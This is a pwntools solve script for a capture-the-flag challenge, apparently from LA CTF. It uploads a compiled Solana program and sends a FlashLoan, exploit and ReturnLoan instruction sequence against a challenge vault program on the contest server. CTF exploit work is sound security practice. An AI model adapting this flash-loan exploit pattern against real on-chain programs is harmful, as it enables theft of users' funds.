#!/usr/bin/env python3

from pwn import *

# p = remote("127.0.0.1", 5000)
p = remote("chall.lac.tf", 31337)

addrs = {}
while True:
    name = p.recvuntil(b": ", drop=True).decode()
    if name == "program pubkey":
        break
    key = p.recvline(keepends=False).decode()
    addrs[name] = key

print(addrs)

# can change pubkey to anything else, this is just a randomly generated valid pubkey
SOLVE_PUBKEY = "2vXNNmancsQhSnuMBPQo2AfNdxRKijNe9pb44sGBbkY8"
p.sendline(SOLVE_PUBKEY.encode())

# copy solve.so to cwd or change this path to ./solve/sbf-solana-solana/release/solve.so
with open("solve.so", "rb") as f:
    solve = f.read()

p.sendlineafter(b"program len: ", str(len(solve)).encode())
p.send(solve)

# list of instructions as (pubkey, accounts, data) triples
# for accounts, s means signer, w means mutable, r means immutable
instructions = [
    (
        addrs["program"],
        """
        user: -w
        vault: -w
        system_program: -r
        instruction_program: -r
        """,
        bytes.fromhex("eff63be08b14af0e"),  # FlashLoan
    ),
    (
        SOLVE_PUBKEY,
        """
        user: sw
        user_permit: -w
        vault: -w
        program: -r
        instruction_program: -r
        system_program: -r
        """,
        b"",
    ),
    (
        addrs["program"],
        """
        user: sw
        vault: -w
        system_program: -r
        """,
        bytes.fromhex("0684a15f5e7cf772"),  # ReturnLoan
    ),
]

p.sendlineafter(b"ix count: ", str(len(instructions)).encode())

for pubkey, accounts, ix_data in instructions:
    p.sendlineafter(b"program id: ", pubkey.encode())

    accounts = [l.strip().split(": ") for l in accounts.strip().split("\n")]
    p.sendlineafter(b"num accounts: ", str(len(accounts)).encode())
    p.sendline("\n".join(f"{b} {addrs[a]}" for (a, b) in accounts).encode())

    p.sendlineafter(b"ix len: ", str(len(ix_data)).encode())
    p.send(ix_data)

p.interactive()
